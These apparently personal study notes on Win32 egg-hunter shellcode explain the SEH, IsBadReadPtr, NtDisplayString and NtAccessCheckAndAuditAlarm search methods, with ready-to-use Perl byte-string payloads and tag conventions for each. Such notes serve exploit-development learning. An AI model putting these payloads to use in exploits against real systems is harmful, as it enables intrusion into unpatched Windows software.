Heap-Only Egg Hunter: http://r00tin.blogspot.com/2009/03/heap-only-egg-hunter.html

Win32 Egghunting

You just have to remember :
-	 The marker needs to be unique (Usually you need to define the tag as 4 bytes inside the egg hunter, and 2 times (2 times right after each other, so 8 bytes) prepended to the actual shellcode. 
-	You’ll have to test which technique to search memory works for a particular exploit.  (NTAccessCheckAndAuditAlarm seems to work best on my system) 
-	Each technique requires a given number of available space to host the egg hunter code :
o	SEH technique uses about 60 bytes.
o	IsBadReadPtr requires 37 bytes
o	NtDisplayString method uses 32 bytes.  (This last technique only works on NT derived versions of Windows. 

Windows Egghunters
-	SEH 
-	IsBadReadPtr
-	NtDisplayString 


There are two distinct methods by which the address space of a given process can be searched on Windows. 
1.	Take Advantage of a feature that is unique to Windows: Structured Exception Handling.
2.	Use the system call validation method that was also used on Linux. 

----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------

SEH:
The following implementation, while rather large, is an example of an egg hunter that installs its own exception handler and fixes up the execution path properly when an invalid address is encountered. Before diving into the analysis, perhaps a little bit of information on the subject of exception handlers would make sense.
To recap, Windows provides a mechanism by which process-relative exception handlers can be registered that can receive notifications regarding things like
access violations, breakpoints, floating point exceptions, and other such runtime errors. These handlers can be chained together, thus allowing for one handler to pass along the exception further down the chain if it does not need to or is unable to deal with the type of exception that has been encountered. These exception handlers are analogous to the C++ and Java exception handlers that are used when class methods throw exceptions to callers in order to pass error information up the stack.

my $egghunter = "\xeb\x21\x59\xb8".
"w00t".
"\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb".
"\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb".
"\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1".
"\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3";

(where w00t is the tag. You could write w00t as “\x77\x30\x30\x74” as well)



IsBadReadPtr:
Second egghunter is smaller than the first.

IsBadReadPtr function simply installs its own exception handler and then dereferences the provided pointer for the given number of bytes to see if it can be read from. 
If the pointer cannot be read from, TRUE is returned, otherwise FALSE is returned and the pointer can be assumed to be valid, at least at that point in execution. 

The implementation will use IsBadReadPtr as a means to validate eight bytes of contiguous memory, much like the other implementations use system calls or their own custom exception handlers.

Egg hunter payload :
my $egghunter = "\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08".
"\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8".
"w00t".
"\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7";



NtDisplayString
The third egg hunter implementation is limited to NT derived versions of Windows, but the concepts should be applicable 9X based versions as well. 

The actual system call that was used to accomplish the egg hunting operation was the NtDisplayString system call.

The NtDisplayString system call is typically used to display text to the bluescreen that some people are (unfortunately) all too familiar with. 

For the purposes of an egg hunter, however, it is abused due to the fact that its only argument is a pointer that is read from and not written to, thus making it a most desirable choice. The actual implementation varies little from the Linux implementations that use system calls (other than the obvious error code and system call number differences):


Egg hunter payload :
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"w00t".
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

-	the edx register is used as the register that holds the pointer that is to be validated throughout the course of the search operation.




Egg hunter using NtAccessCheck (AndAuditAlarm)

Another egg hunter that is very similar to the NtDisplayString hunter is this one :
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
Instead of using NtDisplayString, it uses NtAccessCheckAndAuditAlarm (offset 0x02 in the KiServiceTable) to prevent access violations from taking over your egg hunter. More info about NtAccessCheck can be found here and here.  Also, my friend Lincoln created a nice video about this egg hunter :

